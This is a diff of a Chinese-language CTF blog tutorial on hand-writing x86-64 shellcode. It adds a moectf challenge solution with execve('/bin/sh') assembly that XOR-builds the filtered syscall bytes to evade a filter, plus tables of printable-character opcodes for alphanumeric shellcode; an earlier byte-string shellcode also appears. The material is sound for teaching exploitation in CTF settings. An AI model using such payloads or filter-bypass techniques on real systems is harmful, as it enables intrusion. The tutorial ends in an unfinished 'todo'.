@@ -42,7 +42,7 @@
 <meta property="og:description" content="Shellcode编写入门为什么要手写shellcode？现在的题目对shellcode做了越来越多的限制，比如限制长度，限制特定字符等等。所以一些通用性的shellcode已经很难再起作用，针对某个二进制文件编写特异化shellcode势在必行。">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-09-14T06:29:38.000Z">
-<meta property="article:modified_time" content="2023-10-01T15:54:31.562Z">
+<meta property="article:modified_time" content="2024-04-29T10:24:44.976Z">
 <meta property="article:author" content="hacbit">
 <meta name="twitter:card" content="summary">
 
@@ -240,7 +240,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-01 23:54:31" itemprop="dateModified" datetime="2023-10-01T23:54:31+08:00">2023-10-01</time>
+                <time title="Modified: 2024-04-29 18:24:44" itemprop="dateModified" datetime="2024-04-29T18:24:44+08:00">2024-04-29</time>
               </span>
 
           
@@ -256,14 +256,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>1.7k</span>
+              <span>3.3k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>3 mins.</span>
+              <span>6 mins.</span>
             </span>
 
         </div>
@@ -317,9 +317,224 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span>)</span><br><span class="line"><span class="number">48</span></span><br></pre></td></tr></table></figure>
 
 <p>我们缩减了一半多的shellcode代码，并且执行相同的功能，这就是手搓汇编带来的（）</p>
-<h2 id="OK，你已经学会手搓了，现在来实战吧"><a href="#OK，你已经学会手搓了，现在来实战吧" class="headerlink" title="OK，你已经学会手搓了，现在来实战吧"></a>OK，你已经学会手搓了，现在来实战吧</h2><h3 id="【比赛未结束，暂不放wp】moectf-changeable-shellcode"><a href="#【比赛未结束，暂不放wp】moectf-changeable-shellcode" class="headerlink" title="【比赛未结束，暂不放wp】moectf changeable_shellcode"></a>【比赛未结束，暂不放wp】moectf changeable_shellcode</h3><p><em><strong>附件：</strong></em> <a herf="../resources/pwn_asset/shellcodeBegin/changeable_shellcode" target="_block">changeable_shellcode</a></p>
-<p><strong>注：比赛还未结束，结束后再补上</strong></p>
-<h3 id="羊城杯-shellcode"><a href="#羊城杯-shellcode" class="headerlink" title="羊城杯 shellcode"></a>羊城杯 shellcode</h3><p><em><strong>附件：</strong></em> <a herf="../resources/pwn_asset/shellcodeBegin/shellcode.zip" target="_block">shellcode.zip</a></p>
+<h2 id="OK，你已经学会手搓了，现在来实战吧"><a href="#OK，你已经学会手搓了，现在来实战吧" class="headerlink" title="OK，你已经学会手搓了，现在来实战吧"></a>OK，你已经学会手搓了，现在来实战吧</h2><h3 id="moectf-changeable-shellcode"><a href="#moectf-changeable-shellcode" class="headerlink" title="moectf changeable_shellcode"></a>moectf changeable_shellcode</h3><p><em><strong>附件：</strong></em> <a herf="../resources/pwn_asset/shellcodeBegin/changeable_shellcode" target="_block">changeable_shellcode</a></p>
+<p>简单来说就是过滤了 <code>\x0f\x05</code> 然后shellcode长度不超过 0x28</p>
+<p>一种思路是直接在后面通过异或之类的方法把syscall写在后面</p>
+<p>可以先栈迁移到rwx段，当然为了避免对栈操作影响到原来写的shellcode，所以我这里就 add了 0x40</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push rdx</span><br><span class="line">pop rsp</span><br><span class="line">add rsp, 0x40</span><br></pre></td></tr></table></figure>
+
+<p>然后就是正常构造 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f</span><br><span class="line">push rax	# 把 /bin/sh\0 push到栈顶</span><br><span class="line">push rsp	# 把 binsh字符串地址push到栈顶</span><br><span class="line">pop rdi</span><br><span class="line">xor esi, esi</span><br><span class="line">xor edx, edx</span><br><span class="line">xor eax, 0x6e696720 # 异或构造 \x0f\x05</span><br><span class="line">push rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">push rsp	# 此时rsp指向 \x0f\x05 (syscall)</span><br><span class="line">ret			# 把syscall地址push到栈顶就可以跳转过去getshell了</span><br></pre></td></tr></table></figure>
+
+<p>这个shellcode就只需要 0x22 bytes完全够用</p>
+<h2 id="一些特殊的要求的shellcode"><a href="#一些特殊的要求的shellcode" class="headerlink" title="一些特殊的要求的shellcode"></a>一些特殊的要求的shellcode</h2><h3 id="可见字符限制"><a href="#可见字符限制" class="headerlink" title="可见字符限制"></a>可见字符限制</h3><p>有时候会遇到shellcode只能使用可见字符的限制</p>
+<ul>
+<li>大部分寄存器的push pop都是可见的，而且除了r15，r14这类的，基本都是1一个字节，这对于某些限制长度的情况下特别好用</li>
+<li>部分xor，sub， and等操作</li>
+</ul>
+<p>我这里简单列了个表（</p>
+<blockquote>
+<p>  reg 表示寄存器，后面的数字是位数，比如 reg8， 就是8位（也就是1字节）的寄存器，比如 al，ah寄存器，reg16如 ax，di寄存器</p>
+<table>
+<thead>
+<tr>
+<th>reg</th>
+<th>include</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>reg8</td>
+<td>al, ah, bl, bh, cl, ch, dl, dh, spl, bpl, sil, dil, r8b, r9b, r10b, r11b, r12b, r13b, r14b, r15b</td>
+</tr>
+<tr>
+<td>reg16</td>
+<td>ax, bx, cx, dx, sp, bp, si, di, r8w, r9w, r10w, r11w, r12w, r13w, r14w, r15w</td>
+</tr>
+<tr>
+<td>reg32</td>
+<td>eax, ebx, ecx, edx, esp, ebp, esi, edi, r8d, r9d, r10d, r11d, r12d, r13d, r14d, r15d</td>
+</tr>
+<tr>
+<td>reg64</td>
+<td>rax, rbx, rcx, rdx, rsp, rbp, rsi, rdi, r8, r9, r10, r11, r12, r13, r14, r15</td>
+</tr>
+</tbody></table>
+<p>  im 表示立即数，后面的数字也是代表位数， 比如 0x4141 就是 im16 （2字节立即数）</p>
+<p>  mem 表示内存地址，后面的数字表示取从该地址开始的多少位，比如 mem8 表示取该地址开始的1字节，会与 [] 配合使用</p>
+<p>  [xxx] 表示解引用，这和正常的intel asm语法差不多，比如 xor ax, [rbx]</p>
+<p>  上面的例子中， [rbx] 就是一个 [mem16]， 是因为前面ax是16位所以能推导出 [rbx] 需要取2字节，当然也可以显示的通过 qword， dword， word， byte来指定取8&#x2F;4&#x2F;2&#x2F;1 字节</p>
+</blockquote>
+<h4 id="push-amp-pop"><a href="#push-amp-pop" class="headerlink" title="push &amp; pop"></a>push &amp; pop</h4><table>
+<thead>
+<tr>
+<th>汇编</th>
+<th>机器码</th>
+<th>汇编</th>
+<th>机器码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pop rax</td>
+<td>X</td>
+<td>push rax</td>
+<td>P</td>
+</tr>
+<tr>
+<td>pop rcx</td>
+<td>Y</td>
+<td>push  rcx</td>
+<td>Q</td>
+</tr>
+<tr>
+<td>pop rdx</td>
+<td>Z</td>
+<td>push  rdx</td>
+<td>R</td>
+</tr>
+<tr>
+<td>pop rbx</td>
+<td>[</td>
+<td>push  rbx</td>
+<td>S</td>
+</tr>
+<tr>
+<td>pop rsp</td>
+<td>\</td>
+<td>push  rsp</td>
+<td>T</td>
+</tr>
+<tr>
+<td>pop rbp</td>
+<td>]</td>
+<td>push  rbp</td>
+<td>U</td>
+</tr>
+<tr>
+<td>pop rsi</td>
+<td>^</td>
+<td>push  rsi</td>
+<td>V</td>
+</tr>
+<tr>
+<td>pop rdi</td>
+<td>_</td>
+<td>push  rdi</td>
+<td>W</td>
+</tr>
+<tr>
+<td>pop r8</td>
+<td>AX</td>
+<td>push  r8</td>
+<td>AP</td>
+</tr>
+<tr>
+<td>pop r9</td>
+<td>AY</td>
+<td>push  r9</td>
+<td>AQ</td>
+</tr>
+<tr>
+<td>pop r10</td>
+<td>AZ</td>
+<td>push  r10</td>
+<td>AR</td>
+</tr>
+<tr>
+<td>pop r11</td>
+<td>A[</td>
+<td>push  r11</td>
+<td>AS</td>
+</tr>
+<tr>
+<td>pop r12</td>
+<td>A\</td>
+<td>push  r12</td>
+<td>AT</td>
+</tr>
+<tr>
+<td>pop r13</td>
+<td>A]</td>
+<td>push  r13</td>
+<td>AU</td>
+</tr>
+<tr>
+<td>pop r14</td>
+<td>A^</td>
+<td>push  r14</td>
+<td>AV</td>
+</tr>
+<tr>
+<td>pop r15</td>
+<td>A_</td>
+<td>push  r15</td>
+<td>AW</td>
+</tr>
+</tbody></table>
+<h4 id="xor-amp-add"><a href="#xor-amp-add" class="headerlink" title="xor &amp; add"></a>xor &amp; add</h4><ul>
+<li><code>xor reg8, im8</code> , <code>xor reg16, im16</code> , <code>xor reg32/reg64, im32 </code>  （试了一下好像只有 rax 系列的才行？）</li>
+<li><code>xor reg8/reg16/reg32/reg64, [mem8/mem16/mem32/mem64]</code> （如果要类似 rax + xxxx这样子的地址最好还是加1字节偏移吧，超过一个字节（如：[rax + 0x40404040] 就很难全是可见字符了）</li>
+<li><code>sub reg8, im8</code></li>
+</ul>
+<p><strong>example：</strong></p>
+<table>
+<thead>
+<tr>
+<th>汇编</th>
+<th>机器猫</th>
+<th>汇编</th>
+<th>机器猫</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xor rax, 0x41424344</td>
+<td>H5DCBA</td>
+<td>xor eax, 0x41424344</td>
+<td>5DCBA</td>
+</tr>
+<tr>
+<td>xor ax, 0x4141</td>
+<td>f5AA</td>
+<td>xor ax, 0x6161</td>
+<td>f5aa</td>
+</tr>
+<tr>
+<td>xor al, 0x41</td>
+<td>4A</td>
+<td>xor al, 0x61</td>
+<td>4a</td>
+</tr>
+<tr>
+<td>xor al, byte [rbx + 0x40]</td>
+<td>2CA</td>
+<td>xor bx, [rcx + 0x41]</td>
+<td>f3YA</td>
+</tr>
+<tr>
+<td>xor edi, [rax + 0x40]</td>
+<td>3x@</td>
+<td>xor rbx, [rbp + 0x40]</td>
+<td>H3]@</td>
+</tr>
+<tr>
+<td>sub rax, 0x41424344</td>
+<td>H-DCBA</td>
+<td>sub eax, 0x41424344</td>
+<td>-DCBA</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>todo</strong></p>
 
     </div>
 
@@ -438,7 +653,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8"><span class="nav-number">1.</span> <span class="nav-text">Shellcode编写入门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%89%8B%E5%86%99shellcode%EF%BC%9F"><span class="nav-number">1.1.</span> <span class="nav-text">为什么要手写shellcode？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D"><span class="nav-number">1.2.</span> <span class="nav-text">开始之前</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8E%E7%AE%80%E5%8C%96%E5%B7%A5%E5%85%B7%E7%94%9F%E6%88%90%E7%9A%84shellcode%E5%BC%80%E5%A7%8B"><span class="nav-number">1.3.</span> <span class="nav-text">从简化工具生成的shellcode开始</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OK%EF%BC%8C%E4%BD%A0%E5%B7%B2%E7%BB%8F%E5%AD%A6%E4%BC%9A%E6%89%8B%E6%90%93%E4%BA%86%EF%BC%8C%E7%8E%B0%E5%9C%A8%E6%9D%A5%E5%AE%9E%E6%88%98%E5%90%A7"><span class="nav-number">1.4.</span> <span class="nav-text">OK，你已经学会手搓了，现在来实战吧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E3%80%90%E6%AF%94%E8%B5%9B%E6%9C%AA%E7%BB%93%E6%9D%9F%EF%BC%8C%E6%9A%82%E4%B8%8D%E6%94%BEwp%E3%80%91moectf-changeable-shellcode"><span class="nav-number">1.4.1.</span> <span class="nav-text">【比赛未结束，暂不放wp】moectf changeable_shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-shellcode"><span class="nav-number">1.4.2.</span> <span class="nav-text">羊城杯 shellcode</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8"><span class="nav-number">1.</span> <span class="nav-text">Shellcode编写入门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%89%8B%E5%86%99shellcode%EF%BC%9F"><span class="nav-number">1.1.</span> <span class="nav-text">为什么要手写shellcode？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D"><span class="nav-number">1.2.</span> <span class="nav-text">开始之前</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8E%E7%AE%80%E5%8C%96%E5%B7%A5%E5%85%B7%E7%94%9F%E6%88%90%E7%9A%84shellcode%E5%BC%80%E5%A7%8B"><span class="nav-number">1.3.</span> <span class="nav-text">从简化工具生成的shellcode开始</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OK%EF%BC%8C%E4%BD%A0%E5%B7%B2%E7%BB%8F%E5%AD%A6%E4%BC%9A%E6%89%8B%E6%90%93%E4%BA%86%EF%BC%8C%E7%8E%B0%E5%9C%A8%E6%9D%A5%E5%AE%9E%E6%88%98%E5%90%A7"><span class="nav-number">1.4.</span> <span class="nav-text">OK，你已经学会手搓了，现在来实战吧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#moectf-changeable-shellcode"><span class="nav-number">1.4.1.</span> <span class="nav-text">moectf changeable_shellcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84%E8%A6%81%E6%B1%82%E7%9A%84shellcode"><span class="nav-number">1.5.</span> <span class="nav-text">一些特殊的要求的shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6"><span class="nav-number">1.5.1.</span> <span class="nav-text">可见字符限制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#push-amp-pop"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">push &amp; pop</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xor-amp-add"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">xor &amp; add</span></a></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -789,13 +1004,13 @@ if(canvas.getContext){
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">32k</span>
+    <span title="Symbols count total">34k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">59 mins.</span>
+    <span title="Reading time total">1:01</span>
 </div>
   <div class="powered-by">
     <!--Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> -->
@@ -803,7 +1018,7 @@ if(canvas.getContext){
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">The blog has a total of 30.8k words</span>
+  <span class="post-count">The blog has a total of 31.5k words</span>
 </div>
 
 
